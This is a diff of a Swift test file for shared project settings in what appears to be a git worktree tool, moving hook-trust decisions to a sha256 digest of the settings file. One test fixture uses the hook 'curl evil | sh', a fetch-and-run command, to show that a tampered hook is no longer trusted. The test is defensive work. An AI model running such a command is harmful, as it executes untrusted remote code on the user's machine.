@@ -11,6 +11,18 @@ struct SharedProjectSettingsTests {
     try JSONDecoder().decode(SharedProjectSettings.self, from: Data(json.utf8))
   }
 
+  /// The value as the app has it: written to a repository and read back, so
+  /// its digest is the sha256 of real bytes, which is what a hook decision
+  /// is held against.
+  private func asRead(_ settings: SharedProjectSettings) throws -> SharedProjectSettings {
+    let root = URL(fileURLWithPath: NSTemporaryDirectory())
+      .appendingPathComponent("ms-shared-\(UUID().uuidString)", isDirectory: true)
+    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+    defer { try? FileManager.default.removeItem(at: root) }
+    try settings.write(to: root)
+    return try #require(try SharedProjectSettings.load(from: root))
+  }
+
   @Test func everyFieldIsOptionalAndAWrongTypeCostsThatFieldOnly() throws {
     let shared = try decode(
       #"{ "branchPrefix": "team/", "iconTint": "blue", "postCreateHook": ["npm"], "iconGlyph": "🚀" }"#
@@ -28,12 +40,15 @@ struct SharedProjectSettingsTests {
     #expect(!shared.hasHooks)
   }
 
-  @Test func theHooksTextNamesEachHookSoADecisionIsAboutExactlyThose() {
+  /// The text is what the question shows, and names each hook so the user
+  /// can see which stage would run what. The decision itself is held
+  /// against the file's digest.
+  @Test func theHooksTextNamesEachHookSoTheQuestionSaysWhichStageRunsWhat() {
     let one = SharedProjectSettings(postCreateHook: "npm ci")
     #expect(one.hooksText == "post-create:\nnpm ci")
     let two = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
     #expect(two.hooksText == "post-create:\nnpm ci\n\npre-delete:\nexit 1")
-    #expect(one.hooksText != two.hooksText, "adding a hook is a new question")
+    #expect(one.hooksText != two.hooksText, "a hook added is shown")
     #expect(SharedProjectSettings(branchPrefix: "x/").hooksText == nil)
   }
 
@@ -46,16 +61,22 @@ struct SharedProjectSettingsTests {
     #expect(try SharedProjectSettings.load(from: root) == nil)
     try #"{ "branchPrefix": "team/" }"#.write(
       to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
-    #expect(try SharedProjectSettings.load(from: root)?.branchPrefix == "team/")
+    let loaded = try #require(try SharedProjectSettings.load(from: root))
+    #expect(loaded.branchPrefix == "team/")
+    #expect(
+      loaded.digest
+        == FileDigest.sha256(of: try Data(contentsOf: SharedProjectSettings.file(in: root))),
+      "the digest is of the file's bytes, and is what a hook decision is held against")
     try "not json".write(
       to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
     #expect(throws: (any Error).self) { try SharedProjectSettings.load(from: root) }
   }
 
-  @Test func theUsersValuesWinAndTheFileFillsWhatTheyLeftBlank() {
-    let shared = SharedProjectSettings(
-      worktreeDirectory: "../trees", branchPrefix: "team/", defaultBranch: "develop",
-      postCreateHook: "npm ci", iconGlyph: "hammer", iconTint: 4)
+  @Test func theUsersValuesWinAndTheFileFillsWhatTheyLeftBlank() throws {
+    let shared = try asRead(
+      SharedProjectSettings(
+        worktreeDirectory: "../trees", branchPrefix: "team/", defaultBranch: "develop",
+        postCreateHook: "npm ci", iconGlyph: "hammer", iconTint: 4))
     let blank = ProjectSettings().layered(over: shared)
     #expect(blank.worktreeDirectory == "../trees" && blank.branchPrefix == "team/")
     #expect(blank.defaultBranch == "develop", "a repository may name the branch it merges into")
@@ -64,7 +85,7 @@ struct SharedProjectSettingsTests {
 
     let own = ProjectSettings(
       branchPrefix: "me/", defaultBranch: "trunk", postCreateHook: "make", iconTint: 1,
-      sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
+      sharedHooks: [SharedHooksDecision(digest: try #require(shared.digest), trusted: true)]
     ).layered(over: shared)
     #expect(own.worktreeDirectory == "../trees", "left blank, so the file's")
     #expect(own.branchPrefix == "me/" && own.iconTint == 1)
@@ -176,31 +197,83 @@ struct SharedProjectSettingsTests {
     #expect(ProjectSettings(linkedPaths: " ").layered(over: shared).linkedPaths == " ")
   }
 
-  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheTextIsTheOneTrusted() {
-    let shared = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
-    let text = shared.hooksText!
+  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheFileIsTheOneTrusted() throws {
+    let shared = try asRead(
+      SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1"))
+    let digest = try #require(shared.digest)
     let asked = ProjectSettings()
     #expect(asked.needsHookDecision(for: shared) && !asked.trustsHooks(of: shared))
 
-    let trusted = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: true))
+    let trusted = ProjectSettings(sharedHooks: [SharedHooksDecision(digest: digest, trusted: true)])
     #expect(trusted.trustsHooks(of: shared) && !trusted.needsHookDecision(for: shared))
     let layered = trusted.layered(over: shared)
     #expect(layered.postCreateHook == "npm ci" && layered.preDeleteHook == "exit 1")
     #expect(layered.preCreateHook == "", "a hook the file does not have stays blank")
 
-    let declined = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: false))
+    let declined = ProjectSettings(
+      sharedHooks: [SharedHooksDecision(digest: digest, trusted: false)])
     #expect(!declined.trustsHooks(of: shared) && !declined.needsHookDecision(for: shared))
     #expect(declined.layered(over: shared).postCreateHook == "")
 
-    let changed = SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1")
-    #expect(!trusted.trustsHooks(of: changed), "a changed hook is not the one trusted")
+    let changed = try asRead(
+      SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1"))
+    #expect(!trusted.trustsHooks(of: changed), "a changed hook is not in a file trusted")
     #expect(trusted.needsHookDecision(for: changed), "and is asked about again")
+
+    // The bytes and not the scripts: another key edited is another file,
+    // and asks again about hooks that did not change.
+    let alsoPrefixed = try asRead(
+      SharedProjectSettings(
+        branchPrefix: "team/", postCreateHook: "npm ci", preDeleteHook: "exit 1"))
+    #expect(alsoPrefixed.hooksText == shared.hooksText)
+    #expect(!trusted.trustsHooks(of: alsoPrefixed) && trusted.needsHookDecision(for: alsoPrefixed))
+
+    // Settings that came from no file are held against no digest at all.
+    let unread = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
+    #expect(!trusted.trustsHooks(of: unread) && !trusted.needsHookDecision(for: unread))
+    #expect(trusted.layered(over: unread).postCreateHook == "")
   }
 
-  @Test func aWhitespaceOnlyHookOfTheUsersTurnsTheFilesOff() {
-    let shared = SharedProjectSettings(postCreateHook: "npm ci")
+  /// The file is tracked, so it differs between branches. An answer per
+  /// file means a switch back to a branch already answered for asks
+  /// nothing, where one last answer asked on every switch.
+  @Test func anAnswerIsKeptPerFileSoTwoBranchesHooksAreEachAskedAboutOnce() throws {
+    let main = try asRead(SharedProjectSettings(postCreateHook: "npm ci"))
+    let feature = try asRead(SharedProjectSettings(postCreateHook: "make bootstrap"))
+    var settings = ProjectSettings()
+    settings.recordSharedHooks(file: try #require(main.digest), trusted: true)
+    settings.recordSharedHooks(file: try #require(feature.digest), trusted: false)
+
+    #expect(!settings.needsHookDecision(for: main), "switching back asks nothing")
+    #expect(
+      settings.trustsHooks(of: main) && settings.layered(over: main).postCreateHook == "npm ci")
+    #expect(!settings.needsHookDecision(for: feature), "and the no is remembered too")
+    #expect(!settings.trustsHooks(of: feature))
+    #expect(settings.layered(over: feature).postCreateHook == "")
+
+    // An answer given again is the one that stands, and is not stored twice.
+    settings.recordSharedHooks(file: try #require(feature.digest), trusted: true)
+    #expect(settings.sharedHooks.count == 2 && settings.trustsHooks(of: feature))
+  }
+
+  @Test func theOldestAnswerIsDroppedSoAnEditedFileCannotGrowTheStateForever() {
+    var settings = ProjectSettings()
+    let digests = (0...ProjectSettings.rememberedSharedHooks).map {
+      FileDigest.sha256(of: Data("post-create:\necho \($0)".utf8))
+    }
+    for digest in digests { settings.recordSharedHooks(file: digest, trusted: true) }
+    #expect(settings.sharedHooks.count == ProjectSettings.rememberedSharedHooks)
+    #expect(settings.sharedHooks.first?.digest == digests.last, "the newest answer is kept")
+    #expect(
+      settings.decision(aboutFile: digests[0]) == nil,
+      "the file longest unanswered-about is the one dropped")
+  }
+
+  @Test func aWhitespaceOnlyHookOfTheUsersTurnsTheFilesOff() throws {
+    let shared = try asRead(SharedProjectSettings(postCreateHook: "npm ci"))
     let optedOut = ProjectSettings(
-      postCreateHook: " ", sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
+      postCreateHook: " ",
+      sharedHooks: [SharedHooksDecision(digest: try #require(shared.digest), trusted: true)]
     ).layered(over: shared)
     #expect(optedOut.postCreateHook == " ", "kept as the user's none, not replaced")
   }
